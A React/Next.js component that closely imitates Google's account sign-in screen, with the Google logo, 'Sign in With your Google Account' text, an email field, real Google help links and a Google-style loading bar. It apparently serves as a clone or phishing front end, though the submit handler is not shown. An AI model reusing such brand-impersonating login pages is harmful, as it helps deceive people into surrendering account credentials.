import Image from "next/image";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";

export default function Email({
  email,
  setEmail,
  emailError,
  isEmailError,
  setIsEmailError,
  handleSubmit,
  setEmailError,
}) {
  const [isFocused, setIsFocused] = useState(false);
  const [isAnimating, setIsAnimating] = useState(false);
  const [localIsEmailError, setLocalIsEmailError] = useState(false);
  const [clickCount, setClickCount] = useState(0);

  // Sync local error state with parent when isEmailError changes
  useEffect(() => {
    setLocalIsEmailError(isEmailError);
  }, [isEmailError]);

  // Stop animation if localIsEmailError becomes true
  useEffect(() => {
    if (localIsEmailError && isAnimating) {
      setIsAnimating(false);
    }
  }, [localIsEmailError, isAnimating]);

  const handleSubmitWithAnimation = (e) => {
    // Increment click count to force a fresh animation start
    setClickCount(prev => prev + 1);
    // Reset local error state and start animation immediately
    setLocalIsEmailError(false);
    setIsAnimating(true);
    handleSubmit(e);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-white">
      <div className="bg-white p-10 rounded-lg border border-gray-400 w-96 relative overflow-hidden">
        {/* Bottom layer: Main content */}
        <div className="relative z-0">
          <div className="flex justify-center mb-4">
            <Image
              src="/googlelongicon.png" // Path to your Google logo image
              alt="Google Logo"
              width={100} // Specify the width of the image
              height={50} // Specify the height of the image
              className="h-full"
            />
          </div>
          <h2 className="text-2xl text-black font-normal text-center mb-4">
            Sign in
          </h2>
          <p className="text-sm text-black text-center mb-7">
            With your Google Account
          </p>
          <div>
            <div className="w-full relative">
              {isFocused && (
                <div
                  className={`absolute text-black text-sm bg-white top-[-23%] left-3 text-center flex justify-center items-center px-1 ${
                    isEmailError ? "text-red-500" : "text-blue-600"
                  }`}
                >
                  Email or phone
                </div>
              )}
              <input
                type="email"
                value={email}
                onClick={() => setIsFocused(true)}
                onChange={(e) => {
                  setEmail(e.target.value);
                  setIsEmailError(false);
                }}
                placeholder="Email or phone"
                className={`w-full text-black p-3 border border-gray-400 rounded placeholder:text-gray-500 ${
                  isFocused
                    ? isEmailError
                      ? "ring-red-500 ring-2 outline-none border-none placeholder:text-white"
                      : "ring-blue-600 ring-2 outline-none border-none placeholder:text-white"
                    : "ring-0"
                }`}
                required
              />
            </div>
            <div className="mb-5 font-semibold">
              {isEmailError && (
                <p className="text-red-500 text-xs mt-1">{emailError}</p>
              )}
            </div>
            <div className="text-sm mb-4">
              <a
                target="blank"
                href="https://support.google.com/accounts/answer/7682439?hl=en"
              >
                <span className="text-blue-600 font-semibold hover:underline">
                  Forgot email?
                </span>
              </a>
            </div>
            <div className="text-sm mb-6 text-black">
              Not your computer? Use Guest mode to sign in privately.
              <br />
              <a
                target="blank"
                href="https://support.google.com/accounts/answer/7682439?hl=en"
              >
                <span className="text-blue-600 font-semibold hover:underline">
                  Learn more about using Guest mode
                </span>
              </a>
            </div>
            <div className="flex justify-between items-center font-semibold">
              <a
                target="blank"
                href="https://support.google.com/mail/answer/56256?hl=en"
                className="text-blue-600 text-sm hover:underline"
              >
                Create account
              </a>
              <button
                onClick={handleSubmitWithAnimation}
                className="bg-blue-700 text-white px-6 py-2 rounded-md hover:bg-blue-600 hover:shadow-md shadow-blue-500"
              >
                Next
              </button>
            </div>
          </div>
        </div>

        {/* Middle layer: Semi-transparent white box */}
        <AnimatePresence key={`email-middle-${clickCount}`}>
          {isAnimating && (
            <div className="absolute inset-0 bg-white opacity-60 rounded-lg z-10"></div>
          )}
        </AnimatePresence>

        {/* Top layer: Blue animation bar */}
        <AnimatePresence key={`email-top-${clickCount}`}>
          {isAnimating && (
            <motion.div
              className="absolute top-0 left-0 w-full h-1 bg-blue-600 z-20"
              initial={{ x: "100%" }}
              animate={{ x: "-100%" }}
              transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}
              exit={{ x: "100%", transition: { duration: 0.3 } }}
            />
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}